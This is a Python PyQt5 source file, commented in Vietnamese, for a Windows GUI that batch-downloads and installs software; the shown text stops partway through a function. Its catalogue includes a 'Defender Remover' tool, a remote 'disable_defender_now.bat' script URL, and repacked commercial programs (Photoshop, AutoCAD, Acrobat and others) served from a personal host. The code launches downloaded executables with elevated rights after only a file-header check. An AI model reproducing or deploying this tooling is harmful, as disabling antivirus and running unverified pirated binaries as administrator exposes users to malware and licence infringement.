 # -*- coding: utf-8 -*-
import os
import sys
import time
import threading
import subprocess
import shutil
import ctypes
from ctypes import wintypes
from pathlib import Path
from dataclasses import dataclass
from typing import Optional, Tuple, List
import re
import platform
import requests
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtCore import Qt

# ================== NHẬN DIỆN HỆ 64-BIT ==================
def is_windows_64bit_os() -> bool:
    if os.environ.get("PROGRAMFILES(X86)") or os.environ.get("PROCESSOR_ARCHITEW6432"):
        return True
    mach = platform.machine().lower()
    return mach in ("amd64", "x86_64", "arm64", "aarch64")

IS_WIN64 = is_windows_64bit_os()

# ================== LINK 7-ZIP ==================
SEVEN_ZIP_URLS_64 = ["https://www.7-zip.org/a/7z2408-x64.exe"]
SEVEN_ZIP_URLS_32 = ["https://www.7-zip.org/a/7z2408.exe"]

# === AUTO BAT (MỚI): URL script cần tải ===
AUTO_BAT_URL = "https://raw.githubusercontent.com/ToolsSetupWindows/File/refs/heads/main/disable_defender_now.bat"

# ================== DANH SÁCH ỨNG DỤNG ==================
from PyQt5 import QtWidgets  # needed for QStyle enums in catalog
APP_CATALOG = {
    "Defender Remover": {
        "url64": "https://phuocit.top/Phuocit/DefenderRemover.exe",
        "backup_url64": "",
        "filename64": "DefenderRemover.exe",
        "url32": "https://phuocit.top/Phuocit/DefenderRemover.exe",
        "backup_url32": "",
        "filename32": "DefenderRemover.exe",
        "icon_url": "https://taiwebs.com/upload/icons/windows-defender-remover-logo.png",
        "fallback_icon": QtWidgets.QStyle.SP_MessageBoxInformation,
    },
    "WinRAR": {
        "url64": "https://www.rarlab.com/rar/winrar-x64-701.exe",
        "backup_url64": "https://www.win-rar.com/fileadmin/winrar-versions/winrar-x64-701.exe",
        "filename64": "WinRAR_x64.exe",
        "url32": "https://www.rarlab.com/rar/wrar701.exe",
        "backup_url32": "https://www.win-rar.com/fileadmin/winrar-versions/wrar701.exe",
        "filename32": "WinRAR_x86.exe",
        "icon_url": "https://www.win-rar.com/fileadmin/images/common/favicon.ico",
        "fallback_icon": QtWidgets.QStyle.SP_MessageBoxInformation,
    },
    "UniKey": {
        "url32": "https://github.com/ToolsSetupWindows/Unikey/raw/refs/heads/main/unikey46RC2-230919-win32.zip",
        "backup_url32": "",
        "filename32": "UniKey_Setup_Win32.zip",
        "url64": "https://github.com/ToolsSetupWindows/Unikey/raw/refs/heads/main/unikey46RC2-230919-win64.zip",
        "backup_url64": "https://github.com/ToolsSetupWindows/Unikey/raw/refs/heads/main/unikey46RC2-230919-win32.zip",
        "filename64": "UniKey_Setup_Win64.zip",
        "icon_url": "https://raw.githubusercontent.com/ToolsSetupWindows/Unikey/main/unikey.png",
        "fallback_icon": QtWidgets.QStyle.SP_MessageBoxInformation,
    },
    "EVKey": {
        "url64": "https://github.com/ToolsSetupWindows/EVKey/raw/refs/heads/main/evkey64.zip",
        "backup_url64": "",
        "filename64": "EVKey64-Setup.zip",
        "url32": "https://github.com/ToolsSetupWindows/EVKey/raw/refs/heads/main/evkey32.zip",
        "backup_url32": "",
        "filename32": "EVKey-Setup.zip",
        "icon_url": "https://raw.githubusercontent.com/ToolsSetupWindows/EVKey/main/EVKeyLogo_240.png",
        "fallback_icon": QtWidgets.QStyle.SP_MessageBoxInformation,
    },
    "Full Fonts": {
        "url64": "",
        "backup_url64": "",
        "filename64": "Font.zip",
        "url32": "https://www.dropbox.com/scl/fi/j2roidyk39ws1q74vfd1s/Font.zip?rlkey=bp0w2tlxmxkxbj65ix7dacqws&st=j8leobdg&dl=1",
        "backup_url32": "",
        "filename32": "Font.zip",
        "icon_url": "https://github.com/ToolsSetupWindows/images/raw/refs/heads/main/font.ico",
        "fallback_icon": QtWidgets.QStyle.SP_MessageBoxInformation,
    },
    "Google Chrome": {
        "url64": "https://dl.google.com/dl/chrome/install/googlechromestandaloneenterprise64.msi",
        "backup_url64": "https://dl.google.com/dl/chrome/install/googlechromestandaloneenterprise.msi",
        "filename64": "Chrome_Standalone_64.msi",
        "url32": "https://dl.google.com/dl/chrome/install/googlechromestandaloneenterprise.msi",
        "backup_url32": "https://dl.google.com/dl/chrome/install/googlechromestandalone.msi",
        "filename32": "Chrome_Standalone_32.msi",
        "icon_url": "https://raw.githubusercontent.com/alrra/browser-logos/main/src/chrome/chrome_64x64.png",
        "fallback_icon": QtWidgets.QStyle.SP_MessageBoxInformation,
    },
    "Cốc cốc": {
        "url64": "https://files.coccoc.com/browser/x64/coccoc_standalone_vi.exe",
        "backup_url64": "https://files.coccoc.com/browser/x64/coccoc_standalone_en.exe",
        "filename64": "CocCoc_Setup_x64.exe",
        "url32": "https://files.coccoc.com/browser/coccoc_standalone_vi.exe",
        "backup_url32": "https://files.coccoc.com/browser/coccoc_standalone_en.exe",
        "filename32": "CocCoc_Setup_x86.exe",
        "icon_url": "https://coccoc.com/favicon.ico",
        "fallback_icon": QtWidgets.QStyle.SP_MessageBoxInformation,
    },
    "Fire Fox": {
        "url64": "https://download.mozilla.org/?product=firefox-latest&os=win64&lang=vi",
        "backup_url64": "https://download-installer.cdn.mozilla.net/pub/firefox/releases/latest/win64/vi/Firefox%20Setup%20latest.exe",
        "filename64": "Firefox_Setup_x64.exe",
        "url32": "https://download.mozilla.org/?product=firefox-latest&os=win&lang=vi",
        "backup_url32": "https://download-installer.cdn.mozilla.net/pub/firefox/releases/latest/win32/vi/Firefox%20Setup%20latest.exe",
        "filename32": "Firefox_Setup_x86.exe",
        "icon_url": "https://raw.githubusercontent.com/alrra/browser-logos/main/src/firefox/firefox_64x64.png",
        "fallback_icon": QtWidgets.QStyle.SP_MessageBoxInformation,
    },
    "Zalo PC": {
        "url64": "https://res-download-pc-te-vnso-tt-15.zadn.vn/win/ZaloSetup-25.8.2.exe",
        "backup_url64": "https://res-download-pc-te-vnso-pt-46.zadn.vn/win/ZaloSetup-25.8.2.exe",
        "filename64": "ZaloSetup_x64.exe",
        "url32": "https://res-download-pc-te-vnso-tt-15.zadn.vn/win/ZaloSetup-25.8.2.exe",
        "backup_url32": "https://res-download-pc-te-vnso-pt-46.zadn.vn/win/ZaloSetup-25.8.2.exe",
        "filename32": "ZaloSetup_x86.exe",
        "icon_url": "https://stc-zaloprofile.zdn.vn/favicon.ico",
        "fallback_icon": QtWidgets.QStyle.SP_MessageBoxInformation,
    },
    "Google Drive": {
        "url64": "https://dl.google.com/drive-file-stream/GoogleDriveSetup.exe",
        "backup_url64": "https://dl.google.com/drive-file-stream/GoogleDriveFSSetup.exe",
        "filename64": "GoogleDriveSetup_x64.exe",
        "url32": "https://dl.google.com/drive-file-stream/GoogleDriveSetup.exe",
        "backup_url32": "https://dl.google.com/drive-file-stream/GoogleDriveFSSetup.exe",
        "filename32": "GoogleDriveSetup_x86.exe",
        "icon_url": "https://ssl.gstatic.com/docs/doclist/images/drive_2022q3_32dp.png",
        "fallback_icon": QtWidgets.QStyle.SP_MessageBoxInformation,
    },
    "Ultra view": {
        "url64": "https://www.ultraviewer.net/vi/UltraViewer_setup_6.6_vi.exe",
        "backup_url64": "https://www.ultraviewer.net/vi/UltraViewer_setup_6.5_vi.exe",
        "filename64": "UltraViewer_setup.exe",
        "url32": "https://www.ultraviewer.net/vi/UltraViewer_setup_6.6_vi.exe",
        "backup_url32": "https://www.ultraviewer.net/vi/UltraViewer_setup_6.5_vi.exe",
        "filename32": "UltraViewer_setup.exe",
        "icon_url": "https://www.ultraviewer.net/images/logo.png",
        "fallback_icon": QtWidgets.QStyle.SP_MessageBoxInformation,
    },
    "TeamViewer": {
        "url64": "https://download.teamviewer.com/download/TeamViewer_Setup_x64.exe",
        "backup_url64": "",
        "filename64": "TeamViewer_Setup_x64.exe",
        "url32": "https://dl.teamviewer.com/download/version_15x/TeamViewer_Setup.exe",
        "backup_url32": "",
        "filename32": "TeamViewer_Setup_x32.exe",
        "icon_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/3/31/TeamViewer_Logo_Icon_Only.svg/250px-TeamViewer_Logo_Icon_Only.svg.png",
        "fallback_icon": QtWidgets.QStyle.SP_MessageBoxInformation,
    },    
    "K Lite Codec Pack": {
        "url64": "https://files3.codecguide.com/K-Lite_Codec_Pack_1805_Mega.exe",
        "backup_url64": "https://files2.codecguide.com/K-Lite_Codec_Pack_1805_Mega.exe",
        "filename64": "KLite_Codec_Mega_x64.exe",
        "url32": "https://files3.codecguide.com/K-Lite_Codec_Pack_1805_Mega.exe",
        "backup_url32": "https://files2.codecguide.com/K-Lite_Codec_Pack_1805_Mega.exe",
        "filename32": "KLite_Codec_Mega_x86.exe",
        "icon_url": "https://upload.wikimedia.org/wikipedia/commons/7/76/Media_Player_Classic_logo.png",
        "fallback_icon": QtWidgets.QStyle.SP_MessageBoxInformation,
    },
    "Foxit Reader": {
        "url64": "https://ftp.fagskolen.gjovik.no/pub/foxit-reader/FoxitReader802_enu_Setup_Prom.exe",
        "backup_url64": "https://ftp.fagskolen.gjovik.no/pub/foxit-reader/FoxitReader802_enu_Setup_Prom.exe",
        "filename64": "FoxitReader_x64.exe",
        "url32": "https://ftp.fagskolen.gjovik.no/pub/foxit-reader/FoxitReader802_enu_Setup_Prom.exe",
        "backup_url32": "https://ftp.fagskolen.gjovik.no/pub/foxit-reader/FoxitReader802_enu_Setup_Prom.exe",
        "filename32": "FoxitReader_x86.exe",
        "icon_url": "https://www.foxit.com/static/company_new/assets/images/productCatalog/icons/teal-to-violet.svg",
        "fallback_icon": QtWidgets.QStyle.SP_MessageBoxInformation,
    },
    "Zoom": {
        "url64": "https://zoom.us/client/6.5.11.13227/ZoomInstallerFull.exe?archType=x64",
        "backup_url64": "",
        "filename64": "ZoomInstallerFull_x64.exe",
        "url32": "https://zoom.us/client/6.5.11.13227/ZoomInstallerFull.exe",
        "backup_url32": "",
        "filename32": "ZoomInstallerFull.exe",
        "icon_url": "https://st1.zoom.us/zoom.ico",
        "fallback_icon": QtWidgets.QStyle.SP_MessageBoxInformation,
    },
    "Revo Uninstaller": {
        "url64": "https://phuocit.top/Phuocit/Revo.Uninstaller.Pro.v5.3.5.exe",
        "backup_url64": "",
        "filename64": "Revo.Uninstaller.Pro.v5.3.5.exe",
        "url32": "https://phuocit.top/Phuocit/Revo.Uninstaller.Pro.v5.3.5.exe",
        "backup_url32": "",
        "filename32": "Revo.Uninstaller.Pro.v5.3.5.exe",
        "icon_url": "https://upload.wikimedia.org/wikipedia/commons/8/83/Revouninstallerpro_icon.png",
        "fallback_icon": QtWidgets.QStyle.SP_MessageBoxInformation,
    },
    "CCleaner": {
        "url64": "https://phuocit.top/Phuocit/ccsetup607.exe",
        "backup_url64": "",
        "filename64": "ccsetup607.exe",
        "url32": "https://phuocit.top/Phuocit/ccsetup607.exe",
        "backup_url32": "",
        "filename32": "ccsetup607.exe",
        "icon_url": "https://upload.wikimedia.org/wikipedia/vi/b/b6/CCleaner_Logo_v3.png",
        "fallback_icon": QtWidgets.QStyle.SP_MessageBoxInformation,
    },
    "MathType": {
        "url64": "https://phuocit.top/Phuocit/MathType7.8.0.rar",
        "backup_url64": "",
        "filename64": "MathType7.8.0.rar",
        "url32": "https://phuocit.top/Phuocit/MathType7.8.0.rar",
        "backup_url32": "",
        "filename32": "MathType7.8.0.rar",
        "icon_url": "https://cdn.tgdd.vn/2020/12/GameApp/mathtype-phan-mem-viet-cong-thuc-toan-hoc-cua-logo-28-11-2020-200x200.png",
        "fallback_icon": QtWidgets.QStyle.SP_MessageBoxInformation,
    },
    "Partition Wizard...": {
        "url64": "https://phuocit.top/Phuocit/MiniTool%20Partition%20Wizard%20Technician%2012.9%20(x64).exe",
        "backup_url64": "",
        "filename64": "MiniToolPartitionWizard.exe",
        "url32": "https://phuocit.top/Phuocit/MiniTool%20Partition%20Wizard%20Technician%2012.9%20(x64).exe",
        "backup_url32": "",
        "filename32": "MiniToolPartitionWizard.exe",
        "icon_url": "https://cdn.tgdd.vn/2021/10/GameApp/icon-200x200-4.png",
        "fallback_icon": QtWidgets.QStyle.SP_MessageBoxInformation,
    },
    "Photoshop 2025": {
        "url64": "https://phuocit.top/Phuocit/AdobePTS.2025.v26.3.0.156.exe",
        "backup_url64": "",
        "filename64": "AdobePTS.2025.v26.3.0.156.exe",
        "url32": "https://phuocit.top/Phuocit/AdobePTS.2025.v26.3.0.156.exe",
        "backup_url32": "",
        "filename32": "AdobePTS.2025.v26.3.0.156.exe",
        "icon_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/a/af/Adobe_Photoshop_CC_icon.svg/250px-Adobe_Photoshop_CC_icon.svg.png",
        "fallback_icon": QtWidgets.QStyle.SP_MessageBoxInformation,
    },
    "Acrobat Pro 2025": {
        "url64": "https://phuocit.top/Phuocit/Adobe.Acrobat.Pro.v2024.005.20399x64.rar",
        "backup_url64": "",
        "filename64": "Adobe.Acrobat.Pro.v2024.005.20399x64.rar",
        "url32": "https://phuocit.top/Phuocit/Adobe.Acrobat.Pro.v2024.005.20399x64.rar",
        "backup_url32": "",
        "filename32": "Adobe.Acrobat.Pro.v2024.005.20399x64.rar",
        "icon_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/4/42/Adobe_Acrobat_DC_logo_2020.svg/250px-Adobe_Acrobat_DC_logo_2020.svg.png",
        "fallback_icon": QtWidgets.QStyle.SP_MessageBoxInformation,
    },
    "Illustrator 2025": {
        "url64": "https://phuocit.top/Phuocit/Adobe.Illustrator.2025.v29.3.0.146.exe",
        "backup_url64": "",
        "filename64": "Adobe.Illustrator.2025.v29.3.0.146.exe",
        "url32": "https://phuocit.top/Phuocit/Adobe.Illustrator.2025.v29.3.0.146.exe",
        "backup_url32": "",
        "filename32": "Adobe.Illustrator.2025.v29.3.0.146.exe",
        "icon_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/f/fb/Adobe_Illustrator_CC_icon.svg/250px-Adobe_Illustrator_CC_icon.svg.png",
        "fallback_icon": QtWidgets.QStyle.SP_MessageBoxInformation,
    },
    "CorelDRAW X7": {
        "url64": "https://phuocit.top/Phuocit/CorelDRAWGraphicsSuite.X7.6.x64.exe",
        "backup_url64": "",
        "filename64": "CorelDRAWGraphicsSuite.X7.6.x64.exe",
        "url32": "https://phuocit.top/Phuocit/CorelDRAWGraphicsSuite.X7.6.x64.exe",
        "backup_url32": "",
        "filename32": "CorelDRAWGraphicsSuite.X7.6.x64.exe",
        "icon_url": "https://raw.githubusercontent.com/ToolsSetupWindows/images/main/corel-draw.jpg",
        "fallback_icon": QtWidgets.QStyle.SP_MessageBoxInformation,
    },
    "AutoCAD 2022": {
        "url64": "https://phuocit.top/Phuocit/CAD2022%20Repack.exe",
        "backup_url64": "",
        "filename64": "AutoCAD_2022.exe",
        "url32": "https://phuocit.top/Phuocit/CAD2022%20Repack.exe",
        "backup_url32": "",
        "filename32": "AutoCAD_2022.exe",
        "icon_url": "https://kkhouse.com.vn/wp-content/uploads/2023/02/AutoCAD2022-9.jpg",
        "fallback_icon": QtWidgets.QStyle.SP_MessageBoxInformation,
    },
    "SketchUp Pro 2024": {
        "url64": "https://phuocit.top/Phuocit/SketchUp.Pro.v24.0.594.rar",
        "backup_url64": "",
        "filename64": "SketchUp.Pro.v24.0.594.rar",
        "url32": "https://phuocit.top/Phuocit/SketchUp.Pro.v24.0.594.rar",
        "backup_url32": "",
        "filename32": "SketchUp.Pro.v24.0.594.rar",
        "icon_url": "https://daivocfs.vn/wp-content/uploads/2025/01/sketchup-plugin-2024.jpg",
        "fallback_icon": QtWidgets.QStyle.SP_MessageBoxInformation,
    },
    "Wondershare Filmora 13": {
        "url64": "https://phuocit.top/Phuocit/Wondershare%20Filmora%2013.0.60.5095%20(x64).rar",
        "backup_url64": "",
        "filename64": "Wondershare_Filmora_13.rar",
        "url32": "https://phuocit.top/Phuocit/Wondershare%20Filmora%2013.0.60.5095%20(x64).rar",
        "backup_url32": "",
        "filename32": "Wondershare_Filmora_13.rar",
        "icon_url": "https://m.media-amazon.com/images/I/61o-HyZKcnL._UF1000,1000_QL80_.jpg",
        "fallback_icon": QtWidgets.QStyle.SP_MessageBoxInformation,
    },
    "Camtasia 2024": {
        "url64": "https://phuocit.top/Phuocit/TechSmith%20Camtasia%2024.1.3%20Build%205321%20RePack.rar",
        "backup_url64": "",
        "filename64": "Camtasia_2024.rar",
        "url32": "https://phuocit.top/Phuocit/TechSmith%20Camtasia%2024.1.3%20Build%205321%20RePack.rar",
        "backup_url32": "",
        "filename32": "Camtasia_2024.rar",
        "icon_url": "https://m.media-amazon.com/images/I/41idI7NGYCL._UF1000,1000_QL80_.jpg",
        "fallback_icon": QtWidgets.QStyle.SP_MessageBoxInformation,
    },
    "Bandicam": {
        "url64": "https://phuocit.top/Phuocit/Bandicam.v8.1.0.2516.rar",
        "backup_url64": "",
        "filename64": "Bandicam.v8.1.0.2516.rar",
        "url32": "https://phuocit.top/Phuocit/Bandicam.v8.1.0.2516.rar",
        "backup_url32": "",
        "filename32": "Bandicam.v8.1.0.2516.rar",
        "icon_url": "https://phanmemgoc.org/wp-content/uploads/2024/05/bandicam-update.jpg",
        "fallback_icon": QtWidgets.QStyle.SP_MessageBoxInformation,
    },
}

# ===== Vị trí lưu mặc định =====
DOWNLOAD_DIR = Path.home() / "Downloads" / "AutoInstallers"
DOWNLOAD_DIR.mkdir(parents=True, exist_ok=True)

# ================== KẾT QUẢ TẢI ==================
@dataclass
class DownloadResult:
    ok: bool
    filepath: Path = None
    error: str = ""
    skipped: bool = False

# ================== ICON LOADER ==================
class IconWorker(QtCore.QObject):
    icon_ready = QtCore.pyqtSignal(str, QtGui.QIcon)
    finished = QtCore.pyqtSignal()
    def __init__(self, apps: dict):
        super().__init__()
        self.apps = apps
    @QtCore.pyqtSlot()
    def run(self):
        session = requests.Session()
        headers = {"User-Agent": "PyQt5-IconLoader/1.0"}
        for name, meta in self.apps.items():
            url = meta.get("icon_url") or ""
            try:
                if url:
                    r = session.get(url, timeout=15, headers=headers)
                    r.raise_for_status()
                    icon = self._icon_from_bytes(r.content)
                    if icon and not icon.isNull():
                        self.icon_ready.emit(name, icon)
            except Exception:
                pass
        self.finished.emit()
    def _icon_from_bytes(self, data: bytes) -> QtGui.QIcon:
        img = QtGui.QImage.fromData(data)
        if not img.isNull():
            return QtGui.QIcon(QtGui.QPixmap.fromImage(img))
        try:
            from PyQt5 import QtSvg
            rend = QtSvg.QSvgRenderer(QtCore.QByteArray(data))
            if rend.isValid():
                pix = QtGui.QPixmap(64, 64)
                pix.fill(QtCore.Qt.transparent)
                p = QtGui.QPainter(pix); rend.render(p); p.end()
                return QtGui.QIcon(pix)
        except Exception:
            pass
        return QtGui.QIcon()

# ================== DOWNLOADER ==================
class Downloader(QtCore.QObject):
    progress = QtCore.pyqtSignal(str, int)
    speed = QtCore.pyqtSignal(str, str)
    status_text = QtCore.pyqtSignal(str)
    paused_changed = QtCore.pyqtSignal(bool)
    finished = QtCore.pyqtSignal(str, DownloadResult)
    def __init__(self, app_name: str, urls_to_try: List[str], default_filename: str):
        super().__init__()
        self.app_name = app_name
        self.urls_to_try = [u for u in urls_to_try if u]
        self.default_filename = default_filename
        self._is_cancelled = False
        self._pause_event = threading.Event(); self._pause_event.set()

    @QtCore.pyqtSlot()
    def start(self):
        global DOWNLOAD_DIR
        if not self.urls_to_try:
            self.finished.emit(self.app_name, DownloadResult(False, error="Không có URL để tải."))
            return

        remote_size, suggest_filename, _ = self._probe_remote_meta(self.urls_to_try)
        dest = DOWNLOAD_DIR / (suggest_filename or self.default_filename)

        # Kiểm tra dung lượng còn trống (có buffer 200MB)
        try:
            if remote_size > 0:
                usage = shutil.disk_usage(str(dest.parent))
                need = remote_size + 200 * 1024 * 1024
                if usage.free < need:
                    human = self._fmt_bytes(remote_size)
                    self.finished.emit(self.app_name, DownloadResult(
                        False, error=f"Ổ đĩa không đủ dung lượng lưu (cần ~{human} + 200MB trống). Vui lòng chọn vị trí khác."
                    ))
                    return
        except Exception:
            pass

        # Skip nếu đã có đủ dung lượng khớp
        if remote_size > 0 and dest.exists():
            try: local_size = dest.stat().st_size
            except Exception: local_size = -1
            if local_size == remote_size:
                self.progress.emit(self.app_name, 100)
                self.status_text.emit(f"Đã có sẵn (đúng dung lượng {self._fmt_bytes(remote_size)}), bỏ qua tải.")
                self.finished.emit(self.app_name, DownloadResult(True, filepath=dest, skipped=True))
                return

        # Tải theo danh sách URL
        for link in self.urls_to_try:
            if self._is_cancelled:
                self.finished.emit(self.app_name, DownloadResult(False, error="Đã huỷ tải.")); return
            ok = self._try_download(link, dest)
            if ok: return

        self.finished.emit(self.app_name, DownloadResult(False, error="Lỗi kết nối internet khi tải về.\nVui lòng kiểm tra lại kết nối internet"))

    # ---- meta: size + filename (HEAD -> GET -> RANGE) ----
    def _parse_cd_filename(self, content_disposition: Optional[str]) -> Optional[str]:
        if not content_disposition: return None
        m = re.search(r'filename\*?=(?:UTF-8\'\')?"?([^";]+)"?', content_disposition, flags=re.I)
        if m:
            name = m.group(1).strip()
            return os.path.basename(name)
        return None

    def _probe_remote_meta(self, links) -> Tuple[int, Optional[str], Optional[str]]:
        headers = {"User-Agent": "PyQt5-Downloader/1.0"}
        for link in links:
            if not link: continue
            try:
                h = requests.head(link, timeout=15, allow_redirects=True, headers=headers)
                if 200 <= h.status_code < 400:
                    cl = h.headers.get("content-length"); cd = h.headers.get("content-disposition")
                    name = self._parse_cd_filename(cd)
                    if cl and cl.isdigit(): return int(cl), name, link
                g = requests.get(link, timeout=15, allow_redirects=True, headers=headers, stream=True)
                cl2 = g.headers.get("content-length"); cd2 = g.headers.get("content-disposition"); name2 = self._parse_cd_filename(cd2)
                g.close()
                if cl2 and cl2.isdigit(): return int(cl2), name2, link
                headers_range = dict(headers); headers_range["Range"] = "bytes=0-0"
                r = requests.get(link, timeout=15, allow_redirects=True, headers=headers_range, stream=True)
                cr = r.headers.get("Content-Range") or r.headers.get("content-range")
                cd3 = r.headers.get("content-disposition"); name3 = self._parse_cd_filename(cd3)
                r.close()
                if cr and "/" in cr:
                    total_str = cr.split("/")[-1].strip()
                    if total_str.isdigit(): return int(total_str), name3, link
            except Exception:
                continue
        return 0, None, None

    # ---- xác thực file hợp lệ sau khi tải ----
    def _is_valid_pe(self, path: Path) -> bool:
        try:
            with open(path, "rb") as f:
                head = f.read(0x1000)
                if not head.startswith(b"MZ"): return False
                if len(head) < 0x40: return False
                e_lfanew = int.from_bytes(head[0x3C:0x40], "little", signed=False)
                if e_lfanew < 0x40: return False
                f.seek(e_lfanew); sig = f.read(4)
                return sig == b"PE\x00\x00"
        except Exception:
            return False

    def _is_valid_msi(self, path: Path) -> bool:
        try:
            with open(path, "rb") as f:
                return f.read(8).startswith(b"\xD0\xCF\x11\xE0")
        except Exception:
            return False

    def _try_download(self, url: str, dest_initial: Path) -> bool:
        global DOWNLOAD_DIR
        try:
            self.status_text.emit(f"Đang kết nối . . .")
            headers = {"User-Agent": "PyQt5-Downloader/1.0"}
            with requests.get(url, stream=True, timeout=30, headers=headers, allow_redirects=True) as r:
                r.raise_for_status()

                cd = r.headers.get("content-disposition")
                real_name = self._parse_cd_filename(cd)
                dest = DOWNLOAD_DIR / (real_name or dest_initial.name)

                total = int(r.headers.get("content-length", 0) or 0)
                chunk_size = 1024 * 64
                done = 0; last_t = time.time(); win = 0

                if total > 0:
                    try:
                        usage = shutil.disk_usage(str(dest.parent))
                        need = total + 200 * 1024 * 1024
                        if usage.free < need:
                            self.finished.emit(self.app_name, DownloadResult(False, error="Ổ đĩa không đủ dung lượng lưu. Vui lòng chọn vị trí khác."))
                            return True
                    except Exception:
                        pass

                with open(dest, "wb") as f:
                    for buf in r.iter_content(chunk_size=chunk_size):
                        if self._is_cancelled: self._cleanup(dest, f); return True
                        while not self._pause_event.is_set():
                            time.sleep(0.1)
                            if self._is_cancelled: self._cleanup(dest, f); return True
                        if not buf: continue
                        f.write(buf); done += len(buf); win += len(buf)
                        if total>0: self.progress.emit(self.app_name, min(int(done*100/total), 100))
                        else: self.progress.emit(self.app_name, 0)
                        now=time.time()
                        if now-last_t>=0.5:
                            bps = win/(now-last_t)
                            self.speed.emit(self.app_name, self._human_speed(bps, done, total))
                            win=0; last_t=now

            # ====== XÁC THỰC FILE ======
            ext = dest.suffix.lower()
            valid = True
            if ext == ".exe": valid = self._is_valid_pe(dest)
            elif ext == ".msi": valid = self._is_valid_msi(dest)

            if not valid:
                self.status_text.emit("File tải về không hợp lệ (có thể là HTML/404) → thử link khác . . .")
                dest.unlink(missing_ok=True)
                return False

            self.speed.emit(self.app_name, self._human_speed(0, done, total))
            self.progress.emit(self.app_name, 100 if total>0 else 0)
            self.status_text.emit(f"Tải xong: {dest}")
            self.finished.emit(self.app_name, DownloadResult(True, filepath=dest))
            return True

        except Exception:
            self.status_text.emit("Lỗi mạng  — thử kiểm tra lại mạng hoặc kết nối với mạng khác . . .")
            return False

    def _cleanup(self, dest: Path, f):
        try: f.close(); dest.unlink(missing_ok=True)
        except Exception: pass
        self.finished.emit(self.app_name, DownloadResult(False, error="Đã huỷ tải."))

    def cancel(self): self._is_cancelled = True
    def pause(self): self._pause_event.clear(); self.paused_changed.emit(True); self.status_text.emit("Tạm dừng tải . . .")
    def resume(self): self._pause_event.set(); self.paused_changed.emit(False); self.status_text.emit("Tiếp tục tải . . .")

    def _fmt_bytes(self, n: int) -> str:
        units = ["B","KB","MB","GB"]; i=0; f=float(n)
        while f>=1024 and i<len(units)-1: f/=1024.0; i+=1
        return f"{int(f)} {units[i]}" if i==0 else f"{f:.2f} {units[i]}"

    def _human_speed(self, bps, done, total):
        def fmt(n): return self._fmt_bytes(n)
        if bps>0 and total>0 and done<=total:
            remain=total-done; eta_s=int(remain/bps); mm,ss=divmod(eta_s,60); eta=f" • ETA {mm:02d}:{ss:02d}"
        else: eta=""
        total_text = fmt(total) if total>0 else "?"
        return f"{fmt(bps)}/s – {fmt(done)} / {total_text}{eta}"

# ================== ELEVATION & CÀI ĐẶT ==================
def is_archive_file(path: Path) -> bool:
    return path.suffix.lower() in (".zip", ".7z", ".rar", ".tar", ".gz", ".bz2", ".xz")

def run_elevated(file: str, params: str = "", cwd: Optional[str] = None) -> None:
    ShellExecuteW = ctypes.windll.shell32.ShellExecuteW
    ShellExecuteW.argtypes = [wintypes.HWND, wintypes.LPCWSTR, wintypes.LPCWSTR,
                              wintypes.LPCWSTR, wintypes.LPCWSTR, ctypes.c_int]
    ShellExecuteW.restype = wintypes.HINSTANCE
    ShellExecuteW(None, "runas", file, params, cwd or None, 1)

def which_7z() -> Optional[str]:
    cand = []
    exe = shutil.which("7z")
    if exe: cand.append(exe)
    prog = os.environ.get("ProgramFiles")
    progx86 = os.environ.get("ProgramFiles(x86)")
    for base in filter(None, [prog, progx86]):
        p = os.path.join(base, "7-Zip", "7z.exe")
        if os.path.isfile(p): cand.append(p)
    return cand[0] if cand else None

def download_file(urls: List[str], dest: Path, status_cb=None) -> bool:
    headers={"User-Agent":"PyQt5-Helper/1.0"}
    for u in urls:
        try:
            if status_cb: status_cb(f"Tải 7-Zip: {u}")
            with requests.get(u, stream=True, timeout=30, headers=headers, allow_redirects=True) as r:
                r.raise_for_status()
                with open(dest, "wb") as f:
                    for chunk in r.iter_content(chunk_size=1024*64):
                        if not chunk: continue
                        f.write(chunk)
            return True
        except Exception as e:
            if status_cb: status_cb(f"Lỗi tải 7-Zip từ {u}: {e}")
            continue
    return False

def ensure_7zip(status_cb=None) -> Optional[str]:
    global DOWNLOAD_DIR
    p = which_7z()
    if p: return p
    urls = SEVEN_ZIP_URLS_64 if IS_WIN64 else SEVEN_ZIP_URLS_32
    inst_name = "7zip_x64.exe" if IS_WIN64 else "7zip_x86.exe"
    inst_path = DOWNLOAD_DIR / inst_name
    ok = download_file(urls, inst_path, status_cb)
    if not ok: return None
    if status_cb: status_cb("Cài đặt 7-Zip (silent, elevated)…")
    try:
        run_elevated(str(inst_path), "/S", str(DOWNLOAD_DIR))
    except Exception:
        try: subprocess.Popen([str(inst_path), "/S"], cwd=str(DOWNLOAD_DIR))
        except Exception: return None
    for _ in range(120):
        p = which_7z()
        if p: return p
        time.sleep(1)
    return which_7z()

def extract_with_7z(archive: Path, out_dir: Path) -> None:
    seven = which_7z()
    if not seven:
        seven = ensure_7zip(lambda s: None)
        if not seven: raise RuntimeError("Không cài được 7-Zip để giải nén.")
    out_dir.mkdir(parents=True, exist_ok=True)
    cmd = [seven, "x", "-y", f"-o{str(out_dir)}", str(archive)]
    subprocess.run(cmd, check=True)

PRIORITY_SETUP_FILES = ["setup.bat","install.cmd","_silent install.cmd","install eng.cmd","setup.exe"]

def find_setup_recursively(root: Path) -> Optional[Path]:
    root = Path(root)
    best = {name: (None, 10**9) for name in PRIORITY_SETUP_FILES}
    for dirpath, _, filenames in os.walk(root):
        cur = Path(dirpath); rel = cur.relative_to(root)
        depth = 0 if str(rel) == "." else len(rel.parts)
        lower_map = {f.lower(): f for f in filenames}
        for wanted in PRIORITY_SETUP_FILES:
            lw = wanted.lower()
            if lw in lower_map and depth < best[wanted][1]:
                best[wanted] = (cur / lower_map[lw], depth)
    for wanted in PRIORITY_SETUP_FILES:
        p, _ = best[wanted]
        if p: return p
    return None

def run_installer_for_file(path: Path, status_cb=None) -> None:
    ext = path.suffix.lower()
    if ext == ".msi":
        if status_cb: status_cb("Chạy cài đặt MSI (silent)…")
        run_elevated("msiexec.exe", f'/i "{str(path)}" /qn', str(path.parent)); return
    if ext == ".exe":
        if status_cb: status_cb("Chạy cài đặt EXE…")
        run_elevated(str(path), "", str(path.parent)); return
    if is_archive_file(path):
        if status_cb: status_cb("Phát hiện file nén → kiểm tra 7-Zip, giải nén…")
        out_dir = path.parent / path.stem
        extract_with_7z(path, out_dir)
        setup_path = find_setup_recursively(out_dir)
